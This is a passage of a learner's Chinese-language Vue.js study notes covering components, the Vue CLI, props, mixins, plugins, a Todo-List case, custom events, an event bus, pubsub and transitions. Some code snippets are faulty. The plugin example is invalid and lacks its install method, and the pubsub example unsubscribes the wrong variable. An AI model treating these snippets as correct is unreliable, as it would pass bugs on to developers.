      schoolName: "尚硅谷",
      address: "北京昌平",
    };
  },
};
</script>

<style>
/* 组件的样式 */
</style>

<template>
  <!-- 组件的结构 -->
  <div>
    <h2>学生姓名：{{ studentName }}</h2>
    <h2>学生年龄：{{ age }}</h2>
  </div>
</template>

<script>
export default {
  name: "Student", //追求严谨可以在name属性中写上组件名称
  data() {
    return {
      studentName: "张三",
      age: 18,
    };
  },
};
</script>

<style>
/* 组件的样式 */
</style>
```

* App.vue组件

```Vue
<template>
  <!-- 注意模板里边必须只能有一个根元素 -->
  <div>
    <school></school>
    <student></student>
  </div>
</template>

<script>
//引入组件
import School from "./School.vue";
import Student from "./Student.vue";
export default {
  name: "App",
  components: {
    School,
    Student,
  },
};
</script>

<style>

</style>
```

* main.js

```javascript
// import语句是ES6语法，浏览器不能直接运行
import App from './App.vue'

new Vue({
    el: '#root',
    template: `<app></app>`,
    components:{
        App
    }
})
```

* index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <div id="root">
        <!-- 不要忘记写组件，或者在App.vue中的template写App标签 -->
        <!-- <App></App> -->
    </div>

    <!-- 由于没有在main.js和App.vue中写vue引入，只能在html中写 -->
    <script type='text/javascript' src="./main.js"></script>
    <!-- 在引入组件的时候不要忘记把引入标签写在body的最下边，要不然结构还没出来先引用就没效果了 -->
    <script src="../../js/vue.min.js"></script>
    </script>
</body>
</html>
```

* **所有的注释都很重要，不在外边写了 然后这一堆文件因为Web无法自己解析ES6代码所以运行不了会报错(main.js的第一行报错)，这就引出了——脚手架**

# 第三章：使用脚手架

脚手架新版向下兼容，可以最新版本使用

## 01_分析脚手架结构

提示：以下文件说明顺序是按照npm生成顺序排序

* .gitignore git的忽略文件，哪些文件不想接收git的管理请在这里配置好
* .babel.config.js babel的控制文件，babel是用来ES6转ES5用的工具
* .package.json 如果脚手架用的是npm符合规范配置的文件，那一定会生成包的说明书（有webpack命令）
* .package-lock.json 包版本控制文件
* README.md
* src
  * main.js 在执行npm run serve的时候直接会运行main.js
    * **该文件是整个项目的入口文件**
    * 引入Vue
    * **引入APP组件，它是所有组件的父组件**

```javascript
import { createApp } from 'vue'
import App from './App.vue'

createApp(App).mount('#app')
```

* * App.vue
    * 所有的vue组件都放在了components文件夹当中，除了App.vue是放在src下

* assets 存储静态资源 比如图片和视频
* public
  * favicon.ico 小图标
  * index.html 页面主体

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!-- 配置页签图标，注意路径配置，因为项目开发完毕后配置到服务器会产生各种各样奇奇怪怪的路径错误，所以统一用<%= BASE_URL %>表示public所在的路径 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <!-- 配置网页的标题，路径为在package.json中找到第二行的name的值 -->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <!-- noScript: 如果浏览器不支持js,那么17行的代码会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <!-- 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
```

### render函数

* 在脚手架main.js中的render函数只出现在vue2中，现在以vue2配置的main.js为例讲解render函数

```javascript
import Vue from 'vue'
import App from './App.vue'
Vue.config.productionTip = false

new Vue({
    el: '#app',
    render: h => h(App)
})
```

* 回顾一下没使用脚手架的时候，我们是这么写main.js的

```javascript
import Vue from 'vue'
import App from './App.vue'
Vue.config.productionTip = false

new Vue({
    el: '#app',
    // render: h => h(App)
    template: `<App></App>`,
    components: {App}
})
```

* 由于Vue引用的是没有配置template的版本（即无法识别template配置项的vue代码），所以用template会报错
* render函数必须要配置一个返回值，默认参数为createElement
  * 这个参数是一个函数，需要两个参数，第一个是标签名，第二个是内容
  * render return createElement就会在页面渲染标签了

```
render(createElement){
        return createElement('h1', '你好啊')
    }
```

* render里边没有用到this，就可以用到箭头函数；只有一个参数省略括号；函数只有return一个语句，省略大括号和return；createElement单次太长，随便用一个字母代替，就变成了：

```JavaScript
render : c => c('h1', '你好啊')
```

* 因为渲染的是一整个组件，所以只用传一个参数就行，注意组件不要加引号，加了引号代表传入html的内容了

```JavaScript
render : c => c(App)
```

一般来说，在vue.js(完整版)中包含两种东西，一个是核心（生命周期函数等）和模板解析器

模板解析器占了约三分之一的体积，在开发过程中用到模板解析器也很必要。但是代码写完之后交给webpack进行打包，会生成一个非常大的文件夹，一定也包含Vue.js。

模板解析器不需要存在于打包文件，因为webpack已经可以解析vue文件了。

### 修改默认配置

Vue脚手架隐藏了所有webpack相关的配置，若想查看具体的webpack配置，请执行` vue inspect > output.js`

* 注意output.js文件只是输出一个对象形式的配置，改文件不会影响脚手架现有配置

在脚手架中，以下粉框框住的可以修改名称，红色框框住的不可以(不推荐改)

![IMG_0086](D:\朕还能学\前端笔记\Vue\IMG_0086.PNG)

可以登录官网查看([配置参考 | Vue CLI (vuejs.org)](https://cli.vuejs.org/zh/config/)

Vue脚手架会把新写的配置项和webpack写好的配置进行比较，把默认配置给替换掉

**注意vue.config.js修改了必须要重新npm run serve**

* 常用的修改配置项：lintOnSave
  * 平时做调试的时候基本都把自动语法检查给关了

```javascript
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
  transpileDependencies: true,
  pages:{
    index: {
      entry: 'src/peiqi.js'
    }
  },
  lintOnSave: false
})

```

## 02_ref

获取某行DOM元素`document.getElementById('#title')`

* 在methods中，this指向的是vc实例对象，根据前面学到的内容一定可以获得vm的属性

```html
<template>
    <div>
        <h1 ref="title">title</h1>
        <button ref="btn" @click="showDOM">点我输出上面的DOM元素</button>
        <School></School>
    </div>
</template>

<script>
import School from './components/School'
export default {
    name: 'App',
    components: {
        School
    },
    methods: {
        showDOM(){
            console.log(this.$refs.title)
            console.log(this.$refs)
        }
    }
}
</script>
```

![Snipaste_2022-10-19_08-48-20](D:\朕还能学\前端笔记\Vue\Snipaste_2022-10-19_08-48-20.png)

* this.$refs.title是那一行html
* this.$refs是整个vc中的dom

**如果要给组件打上ref,返回的是组件的实例对象**`this.$refs.sch`，如果利用原生方式获取组件DOM，获取的是school整个html内的dom（不知道为什么我这里和老师的不一样，返回的null）

![Snipaste_2022-10-19_08-51-43](D:\朕还能学\前端笔记\Vue\Snipaste_2022-10-19_08-51-43.png)

讲义：

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实的DOM元素，应用在组件标签上是组件的实例对象（vc）

## 03_props

如何组件复用？

App.vue

```html
<template>
    <div>
        <Student name="丁真" sex="芝士雪豹" age="小学"></Student>
    </div>
</template>
```

Student.vue

```html
<template>
    <h1>{{msg}}</h1>
    <div>学生姓名：{{name}}</div>
    <div>学校年龄：{{sex}}</div>
    <div>学生性别：{{age}}</div>
</template>

<script>
export default {
    name: 'Student',
    data(){
        return {
            msg: '我是梁志超他奶奶',
        }
    },
    //顺序无所谓
    props: ['name', 'sex', 'age']
}
</script>
```

在App的vc中，_data下边只有msg，没有name，sex和age   而在vc中有所有的从子组件props传过来的数据

![Snipaste_2022-10-19_11-31-21](D:\朕还能学\前端笔记\Vue\Snipaste_2022-10-19_11-31-21.png)

* 注意，从父组件传到子组件的值只能是字符串，如果在子组件的插值语法中写{{age + 1}}会把1也转换为字符串（这里age本来传的是数字但是传值转为了字符串）
* 终极解决方案是将app中的标签把age属性改为:age
  * **冒号表示v-bind:，动态绑定属性值，即age的值是运行引号里边js表达式的结果**
  * 如果不加冒号就是单纯传的字符串

```html
<Student name="丁真" sex="芝士雪豹" :age="18"></Student>
```

可以在父组件判断一下，子组件传来的值哪些该收哪些不该收

```javascript
    //顺序无所谓，简单接收
    // props: ['name', 'sex', 'age']

    //接收的同时对数据进行类型限制
    props: {
        name: String,
        age: Number,
        sex: String
    }

```

如果传错了值，浏览器会报错

![image-20221019182804915](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221019182804915.png)

也可以采用另一种方式：

```javascript
props: {
        name: {
            type: String, //name的类型时字符串
            required: true, //name是必须的
        },
        age: {
            type: Number,
            default: 99 //不传值直接变成99岁
        },
        sex: {
            type: String,
            required: true
        }
    }
```

每一个传入的属性作为一个对象，type是表示类型，required表示是否必须，default表示不必须但是如果不传使用默认设置的值

细节：

* 一般在实际开发中大多使用的是最简单的写法，如果Student传入了多余值，则直接在vc中显示undefined
* 在子组件中不允许更改父组件的传入的值，会报错（老师的能改会报错，我的改不了）
  * 解决方法：**在data中设置新的变量读取传入的props属性，这也说明了传入的属性是先于data中的数据放在vc上的，并且子组件中的this中是可以拿到父组件的属性**，然后再插值语法中放上去新的变量。

![image-20221019183753927](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221019183753927.png)

* 接收的属性和data中的属性不要重名
* 传输的属性名不要设置为“key”，因为这个key是给节点做标记用的

讲义：

* 功能：让组件接收外部传过来的数据

1. 传递数据： <Demo name="xxx"/>

2. 接收数据：

   1. 第一种方式（只接收）：props:['name']

   2. 第二种方式（限制类型）：props{name: Number}

   3. 第三种方式（限制类型、限制必要性、指定默认值）：

      ```
      props:{
      	name: {
      		type: String,
      		required: true,
      		default: 'xxx'
      	}
      }
      ```

## 04_mixin（混入）配置

在两个组件中有可能有一样的方法，这时候可以通过混入配置取代掉两个组件中相同的方法

* 单独写一个js文件内置方法
* 然后在需要调用方法的组件中利用mixins配置引入，**要写成数组形式**
  * 注意暴露形式，分别暴露对应的引入必须写花括号

**mixin.js（这个名随便取）**

```JavaScript
//这种叫分别暴露
export const mixin = {
    methods: {
        showName(){
            alert(this.name)
        }
    },
}

export const mixin2 = {
    data(){
        return {
            x:100
        }
    }
}
```

**school.vue/student.vue**

```html
<script>
import {mixin, mixin2} from '../mixin.js'
export default {
    name: 'Student',
    data(){
        return {
            name: '张三',
            sex: '男'
        }
    },
    mixins:[mixin, mixin2]
}
</script>
```

mixin不仅可以传方法，也可以传data属性

* **当mixin的属性和组件中的data属性名称相同时，以data的赋值为主**
* **当mixin引入声明周期函数的时候，会和当前组件内的生命周期函数叠加**

也可以在main.js给vm和vc全局混入配置

* 在截屏中，由于混合属性中mounted周期有一个打印，在vm和三个vc中都输出了一遍（但是我的脚手架用的是vue3所以这么写不好使）

![IMG_0087](D:\朕还能学\前端笔记\Vue\IMG_0087.PNG)

## 05_plugin插件

Vue的插件本质是一个对象，但是对象中必须要有`install`方法

**plugins.js**

```javascript
//只需要暴露一个的时候，可以写export default obj,或者直接如下写法
export default {
    //全局过滤器
        Vue.filter('mySlice', function (value) {
                return value.slice(0, 4)
            }),
            //定义全局自定义指令
            Vue.directive('fbind', {
                //当指令与元素成功绑定时（一上来）
                bind(element, binding) {
                    element.value = binding.value
                },
                //指令所在元素被插入页面时
                inserted(element, binding) {
                    element.focus()
                },
                //指令所在的模板被重新解析时
                update(element, binding) {
                    //在重新解析的时候别忘了加上代码
                    element.value = binding.value
                }
            })
        //定义混入
        Vue.mixin({
            data() {
                return {
                    x: 100,
                    y: 200
                }
            }
        })
        //给Vue原型上添加一个方法，在Vue原型上的方法vm和vc都能用
        Vue.prototype.hello = () => {
            alert('你好啊')
        }
}
```

**main.js**

```javascript
import { createApp } from 'vue'
import App from './App.vue'
import plugins from './plugins'

createApp(App).use(plugins)
createApp(App).mount('#app')
```

* 每一个对象必须要有一个install方法
* 函数的默认参数是Vue的构造函数，vm的缔造者
* 使用在main.js调用`Vue.use(plugins)`就好 但是我的Vue3不支持这样写

讲义

* 功能：用于增强Vue
* 本质：包含install方法的一个对象，**install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据**

## 06_scoped样式

* 当两个组件中用到相同的类名定义不同的样式，在app中后边的组件样式会覆盖前面的组件样式
  * 在app中，优先引入组件，然后执行代码，最后解析模板

![IMG_0091](D:\朕还能学\前端笔记\Vue\IMG_0091.PNG)

* 在style标签中加入scoped属性后，Vue会给每一个标签都加一个类

![image-20221021094513345](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221021094513345.png)

* 一般来说，App中的style标签不需要加scoped，因为它只会给非组件标签加类名，不会传递到子组件中

* `<style lang="css">` 其中的lang指的是language，语言 可以选择css和less等
  * 脚手架不能读取less，但是可以安装 `npm i less-loader` 这个是webpack学的
  * 可以在module中的webpack包的package.json查到脚手架支持的安装版本
* less可以嵌套

## 07_Todo-List 案例

### 组件化编码流程（通用）

1. 实现静态组件：抽取组件，使用组件实现静态页面效果
2. 展示动态数据：
   1. 数据的类型、名称是什么？
   2. 数据保存在那个组件
3. 交互——从绑定事件监听开始

![IMG_0092(20221021-101805)](D:\QQ下载和缓存\MobileFile\IMG_0092(20221021-101805).PNG)

* 在实际开发过程当中，我们通常采取一个功能一个组件的形式

* 在实际给脚手架起名时，一般使用大驼峰形式，并且一般开头是User...
  * **注意不要和内置的标签重名**

### 初始化列表

* 在给数据起名时，一般是数组套对象
  * 以本案例为例，每一个对象要有id,name和完成状态
* 一般在纯前端生成数组时，id用nanoid自动生成

### 添加列表

* 兄弟组件之间的传值
  * 在父组件定义一个函数和一个data信息，将函数名和数据分别利用props方式传入发送信息的子组件和接受信息的子组件
  * 把MyList中的data数据转移到APP中，然后在app利用props传值给mylist
  * 在app中定义一个函数，参数是一行list对象，执行内容是把这个新的对象加入到data中的列表数组的第一个，利用props把这个函数传到myheader中
  * 注意props传入的函数和组件本身methods函数不能重名，（优先会在vc中放入props的函数）

### 勾选

* item中，勾选可以用@click监听，也可以用@change监听

<img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221026212343069.png" alt="image-20221026212343069" style="zoom:50%;" />

* 注意，因为所有列表的data数据存储在app中，所以要在app下写checkTodo函数（item中被选中的id的勾选状态取反），然后通过props方法，从app传到myList再传到myItem中

<img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221026212304498.png" alt="image-20221026212304498" style="zoom: 80%;" />

* 当然你也可以这样写：
  * 如果checkbox的v-model绑定了一个布尔值，那么这个布尔值就是勾选的状态
  * 可以利用v-model的双向数据绑定，改变选中状态就直接改变了todo.done的数值，即checkTodo函数和checkedChange函数都不用写了
  * **但是注意，不推荐这样写。因为props是只读的，v-model会修改props传入的数据。但是控制台不报错，能正常运行**
    * 因为Vue只会监测到地址修改。一个对象只改了一个属性由于地址没有发生变化，Vue监测不到；如果把整个对象都替换掉那Vue就会监测到了
  * 所以v-model不要和props一起用

### 删除

App.vue 删除 和上一节的写法类似

```javascript
//删除一个todo
    deleteTodo(id){
      //注意filter不改变原数组 返回值是新数组的条件
      // this.todos = this.todos.filter((todo) => {
      //   return todo.id !==id
      // })
      //精简版
      this.todos = this.todos.filter(todo => todo.id !== id)
    }
```

### 底部设计

MyFooter.vue 计算当前被勾选的任务数量

```javascript
  computed: {
    doneTotal(){
      let i = 0
      this.todos.forEach((todo) => {
        if(todo.done) i++
      })
      return i
    }
  }
```

* reduce方法：专门用于做条件统计 [Array.prototype.reduce() - JavaScript | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce)
  * 数组有几个元素执行几次回调函数
  * 回调函数有两个参数，第一个参数第一次的值为传入的初始值，之后再调用为上一次回调函数的返回值。如果函数没有返回值，则参数为undefined
  * 最后一次调用函数的返回值作为reduce的返回值
  * 第二个参数是传入的数组项
* 利用这个函数方法可以替代上面的写法

```javascript
doneTotal(){
      // const x = this.todos.reduce((pre, curr) => {
      //   return pre + (curr.done ? 1 : 0)
      // }, 0)
      // return x
      return this.todos.reduce((pre, curr) => pre + (curr.done ? 1 : 0))
    }
```

* 面试会经常问前端有关于数组的方法，**“请你说出你再开发过程中常用的数组方法”**

### 底部交互

`<input type="checkbox" :checked="doneTotal === total" @change="checkAll"/>`

**computed:**

```javascript
total(){
      return this.todos.length
    },
    doneTotal(){
      // const x = this.todos.reduce((pre, curr) => {
      //   return pre + (curr.done ? 1 : 0)
      // }, 0)
      // return x
      return this.todos.reduce((pre, curr) => pre + (curr.done ? 1 : 0), 0)
    },
    //一个计算属性是可以拿着另外两个属性进行计算的
    isAll(){
      return this.doneTotal === this.total
    }
```

**methods(给父元素传值)：**

```javascript
checkAll(e){
      //获取checkbox的勾选状态用checked
      console.log(e.target.checked)
      this.checkAllTodo(e.target.checked)
    }
```

* 在一个输入DOM中，有被赋予的初始值(:checked)，有后续需要更改的需求(@change)，那么我们可以用v-model
* 注意，我们需要更改的数据是一个计算属性，所以用computed简写形式（只有getter没setter）不行，需要写成完整形式

**v-model简写版：**

```javascript
isAll: {
      get(){
        return this.doneTotal === this.total
      },
      set(value){
        this.checkAllTodo(value)
      }
    }
```

### 总结

1. 组件化编码流程
   1. 拆分静态组件：组件要按照**功能点**拆分，命名不要与html元素冲突
   2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用
      1. 一个组件再用：放在组件自身即可
      2. **一些组件在用：放在他们共同的父组件上（状态提升）**
   3. 实现交互：从绑定事件开始
2. props适用于：
   1. 父组件 ==> 子组件 通信
   2. **子组件 ==> 父组件 通信 （要求父组件给子组件一个函数）**
3. **使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的**
4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错

### 将信息存储在本地缓存中

**App.vue主要更改如下**

```javascript
data() {
    return {
      //如果本地存储的为空数组，那么会返回null，在footer组件中会用到todos的length，就会报错
      todos: JSON.parse(localStorage.getItem('todos')) || []
    }
  },
  watch: {
    todos: {
      //在勾选时，因为改变的是对象中的某一个键值对，所以必须要使用深度监视
      deep: true,
      handler(value) {
        //Unshift更改数组元素可以被Vue监测到
        localStorage.setItem('todos', JSON.stringify(value))
      }

    }

  }
```

## 08_浏览器本地存储 WebStorage

<img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221027154427117.png" alt="image-20221027154427117" style="zoom:80%;" />

调用localStorage方法，添加本地缓存

```html
<script type="text/javascript">
        function saveDate(){
            //window.localStorage 在window的函数可以直接写函数名
            localStorage.setItem('msg', 'hello')
        }
    </script>
```

* 如果把值设置为对象的话，那么在浏览器中就会显示`[object Object]` 即如果setItem方法第二个值不是字符串类型那么一定会转成字符串类型再传入
  * 可以利用`JOSN.stringify()`将对象转化为json，并且转化为JSON的字符串在值也会显示为对象形式
  * 读不出来的是null，JSON.parse(null) 也是null
* LocalStorage最大的特点就是关闭浏览器不消失
* sessionStorage和localStorage的API一模一样，但是sessionStorage是关闭会话就清除了痕迹

## 10_组件自定义

### 组件的绑定

`<my-student v-on:atguigu="demo"></my-student>`

由于v-on在school上，是给了**school这个组件的实例对象vc绑定了一个事件**，叫atguigu

```html
<!-- 由于v-on在school上，是给了school这个组件的实例对象vc绑定了一个事件，叫atguigu -->
        <my-school :getSchoolName="getSchoolName"></my-school>
        <!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 -->
        <my-student v-on:atguigu="getStudent"></my-student>
```

* 利用props和自定义组件传值
  * 相同点是都需要在methods中配置一个回调
  * props在父组件写完方法之后，把函数通过组件标签传给了子组件，子组件需要利用props引用再调函数
  * 自定义组件只是给子组件实例对象绑定了一个自定义事件，并没有给子组件传值
  * ​	` <my-student @atguigu="getStudent"></my-student>`这样写也可以

除了以上两种传值方式，还可以使用ref获取子组件的vc实例对象

* 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref）

`<my-student ref="MyStudent"></my-student>`

```javascript
mounted() {
        console.log(this.$refs.MyStudent)
        this.$refs.MyStudent.$on('atguigu', this.getStudent)
    }
```

* 使用情景包括：如果我要求在挂载完成3秒钟之后再绑定事件，那么以上两种传值方式均不能办到

如果我只让事件执行一次，可以这样写：

* `<my-student @atguigu.once="getStudent"></my-student>`

* 或者使用第三种写法换一个api: `this.$refs.MyStudent.$once('atguigu', this.getStudent)`

**如果函数传参很多的话，一般在传参时用对象包装，或者在定义函数时形参写...params（ES6）**，这样会返回一个对象

```
getStudent(...params){
            console.log("收到了学生名",params)
        }
```

### 解绑

`this.$off('atguigu')` //解绑一个自定义事件

`this.$off(['atguigu','demo'])` //解绑多个自定义是事件，**注意要用中括号括起来**

或者利用$destory，销毁后所有Student实例的自定义事件全都不奏效了

```
death(){
            this.$destroy() //销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效了
        }
```

在root中$destory，子组件的实例对象自定义事件也不奏效了（但是为什么老师的版本原生DOM生效，新版本把原生DOM一块删了呢）

### 总结

* 在Vue中谁触发的事件，这个事件回调函数当中的this就是谁

```javascript
this.$refs.MyStudent.$on('atguigu', function(name, ...params){
            console.log('App收到了学生名：', name, params)
            console.log(this) //这里边的this指向的是student组件实例对象
        })
```

那为什么`this.$refs.MyStudent.$on('atguigu', this.getStudent)`写，this的指向就是app了呢

* 如果一个方法写在了methods里边，并且用的是普通函数，那么methods里边的this一定指的是app组件实例对象

* 如果写成箭头函数，箭头函数没有自己的this，只能向外找（mounted），和上面的约束条件一样，如果mounted也是普通函数，那么this指向APP组件实例对象



* 写在组件里边的原生dom事件也会被当成自定义事件，必须要添加一个修饰符native

` <my-student ref="MyStudent" @demo="m1" @click.native="show"></my-student>`

* 这样就把click事件交给了组件中最外层的标签

讲义：

1. 组件的自定义事件是一种组件间的通信方式，适用于：<span style="color: red; font-weight: bold">子组件 ===> 父组件</span>**（父亲给儿子传值用props）**

2. 使用场景：A是父组件，B是子组件，B想传给A传数据，那么就要在A中给B绑定自定义事件（事件的回调在A中）

3. 绑定自定义事件：

   1. 第一种方式，在父组件中：`<Demo @atguigu="test">` 或 `<Demo v-on:atguigu="test">`

   2. 第二种方式，在父组件中：

      ```
      <Demo ref="demo">
      	...
      	mounted(){
      		this.$refs.xxx.$on('atguigu', this.test)
      	}
      ```

   3. 若想让自定义事件中只能触发一次，使用Once修饰符，或`$once`方法

4. 触发自定义事件： `this.$emit('atguigu', this.name,666,88,99999)`

5. 解绑自定义事件：`this.$off('atguigu')`

6. 组件上也可以绑定原生DOM事件，需要使用`native`修饰符

7. 注意：通过`this.$refs.xxx.$on('atguigu', 回调)` 绑定自定义事件，回调要么配置在methods中，要么用箭头函数，否则this指向会出问题

### todoList改进

在父给子传函数时：

* 如果父用的`:xxx="xxx"`，则是props写法，需要在子元素中调用方法写this.xxx
* 如果父用的`@xxx="xxx"`或者`v-bind:xxx="xxx"`或者 `ref="xxx"...this.$ref.xxx.$on('xxx', 回调)`，则需要在子组件中写`this.$emit("xxx", 参数)`，并且需要解绑`this.$off('xxx')`

## 11_全局事件总线（这一节非常难，把前面东西都串起来了）

**全局事件总线(GlobalEventBus)是一种组件间通信的方式，可以实现任意组件间的通信**

现在有一个x函数，不属于任何组件。现在在A组件中给x绑定了一个自定义事件demo，所以自定义事件demo的回调函数留在了A组件。现在B组件是A组件的兄弟组件，B中触发了x身上的demo的自定义事件，并且在触发数据的同时传了一个值'666'。那么x身上的demo就触发了，demo对应的回调就要被执行，回调的'666'就以参数的形式来到了A中。

<img src="D:\QQ下载和缓存\MobileFile\F4FF5AD31E0A9400FBBC599672C6F1D3.png" alt="F4FF5AD31E0A9400FBBC599672C6F1D3" style="zoom: 25%;" />

其他组件传值同理，那么x函数需要符合什么条件才能让所有的组件都能通过它传值？

* 所有的组件都能看到x
* 能调用$on $off $emit

如果在main.js中写在window里边，是可以办到的，但是一般不这么写。

如果写在vc实例中，那每生成一个新的vc都要再重新写一遍

如果写在VueComponent中，每生成一个新的组件，就会调用Vue.extend，就会返回一个新的VueComponent，详见非单文件组件

**所以要写在Vue的原型对象**

**mian.js**

```javascript
import Vue from 'vue'
import App from './App.vue'
Vue.config.productionTip = false

Vue.prototype.x = {a:1, b:2}

new Vue({
    el: '#app',
    render: h => h(App)
})
```

但是光上面那么写不行，因为x中的\__proto__没有$on、$off、$emit这个方法。**在Vue的原型对象有，沿着原型链找不到。因为$on方法就是定义在Vue的原型对象上面的，即只能在vm和vc中找到。**

**先试一下让x等于vc**

* 先创建一个demo组件，利用extend，不需要任何组件信息
* demo实例化，平时都是直接写的组件标签创建的，需要亲自new一下

**mian.js**

```javascript
import Vue from 'vue'
import App from './App.vue'
Vue.config.productionTip = false

const demo = Vue.extend({})
const vc = new demo()

Vue.prototype.x = vc

new Vue({
    el: '#app',
    render: h => h(App)
})
```

现在是Student给School传值：

**Student（相当于图中的D组件）**

```
sendStudentName(){
            this.x.$emit('hello', 666)
        }
```

**School（相当于图中的A组件）**

```javascript
mounted(){
        console.log('School', this.x)
        this.x.$on('hello', data => {
            console.log('我是School组件，收到了数据', data)
        })
    }
```



**我们再试一下令x=vm**

反面案例：

```javascript
import Vue from 'vue'
import App from './App.vue'
Vue.config.productionTip = false

const vm = new Vue({
    el: '#app',
    render: h => h(App)
})

Vue.prototype.x = vm
```

这么写不行，因为在new Vue执行完毕后，app的生命周期挂载阶段已经执行完毕，在School的mounted中x依然没有on

**利用声明周期函数，在挂载之前把总线加上，其中this指的就是vm**

```javascript
new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate(){
        Vue.prototype.$bus = this
    }
})
```

一般全局事件总线定义为$bus，$表示Vue中的接口，bus为总线

一般在使用完总线的一个方法之后，我们通常销毁这个方法，但是不能用$off()中括号里边啥也不加，因为这样表示会把总线整个销毁

**school**

```javascript
    beforeDestroy(){
        this.$bus.$off('hello')
    }
```

### todoList修改

略

## 12_消息订阅

**pubsub.js库**

在任何框架下都可以使用这个库`npm pubsub-js`

**Student.vue**

```javascript
import pubsub from 'pubsub-js'
methods:{
        sendStudentName(){
            pubsub.publish('hello', 666)
        }
    }
```

**MySchool.vue**

```javascript
import pubsub from 'pubsub-js'
mounted(){
        this.pubsub = pubsub.subscribe('hello', function(msgName, data){
            console.log('有人发布了hello，hello消息的回调执行了')
        })
    },
 beforeDestroy(){
        pubsub.unsubscribe(this.pubId)
    }
```

**订阅消息的回调函数的两个参数分别是订阅方法名和传递值**

取消订阅需类似定时器，需要在this上挂载这个方法，然后利用接口销毁

注意回调函数是普通函数，里面的this仍然是指向hello的，要是想在回调中使用Vue的this，写成箭头函数或者把回调函数写在methods中，接口第二个参数调用这个函数

在Vue中用的不多，因为事件总线和它太类似了

### todoList修改

一般来说，订阅方法名用不到，但是必须要接收，因为是第一个参数，所以一般用下划线占位，这样就不会提示第一个参数没有使用了

`deleteTodo(_,id){...}`

## 13_todoList 扩展

### 编辑按钮

所有组件都要用到的样式，放在APP中

**如果要给vc添加响应式数据，利用this.$set(todo, 'isEdit', true)实现 详见Vue数据监测原理**

### $nextTick

在一个函数中改响应式的时候，Vue为了提高效率，当函数全部执行完毕后才会重新解析模板，这样避免了修改一个响应式就重新解析一次模板。存在特殊的情况需要在编译模板之后立刻调用DOM，这时候的函数执行顺序和解析模板的时间就可能会起冲突，即函数执行要操作的DOM还没渲染

**$nextTick中的回调函数会在DOM节点更新模板完毕后执行，可以用于自动焦点方法**

`this.$nextTick(回调函数)`在下一次DOM更新结束后执行其指定的回调

定时器也可以达到一样的目的，即使定时器不设置时间，也会把回调塞到队列执行

## 14_过度与动画

利用transition标签和v-show属性，Vue可以自动帮助我们生成动画。

transition标签不是DOM，name属性是标签名，如果加上name属性那么style改选择器名。appear是在加载页面时是否触发入场动画，说明见代码。

### 动画效果

style中需要先定义好CSS3动画，开始和结束的选择器名称叫`v-enter-active 和 v-leave-active`其中v是需要改成transition标签中的name属性，要不然不会识别。

```html
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <!-- appear或者直接单写也行 -->
    <transition name="hello" :appear="true">
      <h1 v-show="isShow">你好啊</h1>
    </transition>
  </div>
</template>

<script>
  export default {
    name: 'MyTest',
    data(){
      return {
        isShow: true
      }
    }
  }
</script>

<style scoped>
  h1{
    background-color: orange;
  }

  .hello-enter-active{
    animation: atguigu 1s;
  }
  
  .hello-leave-active{
    animation: atguigu 1s reverse;
  }

  @keyframes atguigu {
    from{
      transform: translateX(-100%);
    }
    to{
      transform: translateX(0)
    }
  }
</style>
```

### 过度效果

**CSS 比动画写得稍微麻烦一点**

```html
<style scoped>
  h1{
    background-color: orange;
  }

  /* 进入的起点 离开的终点 */
  .hello-enter, .hello-leave-to{
    transform: translateX(-100%);
  }

  /* 进入和离开的过程中 */
  .hello-enter-active, .hello-leave-active{
    transition: .5s ease-in-out
  }

  /* 进入的终点 离开的起点 */
  .hello-enter-to, .hello-leave{
    transform: translateX(0);
  }
</style>
```

### 多个元素过度

`transition`只能内嵌一个元素

`transition-group`可以嵌套多个，但是注意子标签必须要有key值

### 集成第三方动画

[Animate.css | A cross-browser library of CSS animations.](https://animate.style/)

`npm i animate.css`

**html 注意animation标签的name和子标签的class** 

```html
<transition-group 
      name="animate__animated animate__bounce" 
      enter-active-class="animate__swing"
      leave-active-class="animate__backOutUp"
      :appear="true"
    >
      <h1 v-show="isShow" key="1">你好啊</h1>
      <h1 v-show="!isShow" key="2">你好啊</h1>
    </transition-group>
```

### 总结

1. 作用：在插入、更新或移除DOM元素的时，在合适的时候给元素添加样式类名
2. 图示：

![image-20221029170951610](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221029170951610.png)

3. 写法：
   1. 准备好样式：
      * 元素进入的样式：
        1. v-enter: 进入的起点
        2. v-enter: 进入过程中
        3. v-enter-to：进入的终点
      * 元素离开的样式：
        1. v-leave：离开的起点
